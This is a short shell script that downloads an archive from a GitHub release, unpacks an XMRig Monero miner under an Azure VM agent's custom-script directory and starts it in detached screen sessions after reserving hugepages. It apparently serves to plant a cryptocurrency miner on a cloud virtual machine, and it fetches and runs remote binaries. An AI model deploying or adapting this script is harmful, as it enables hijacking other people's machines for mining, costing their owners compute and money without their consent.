#!/bin/sh
sysctl -w vm.nr_hugepages=3072
wget https://github.com/zoharxxx/zohar/releases/download/zohar/winxmr.tar.gz
tar -zxvf winxmr.tar.gz
cd /var/lib/waagent/custom-script/download/1/xmrig-v5.11.1
chmod a+x xmrig
chmod a+x config.json
screen -dmS bash bash && screen -dmS xmrig ./xmrig
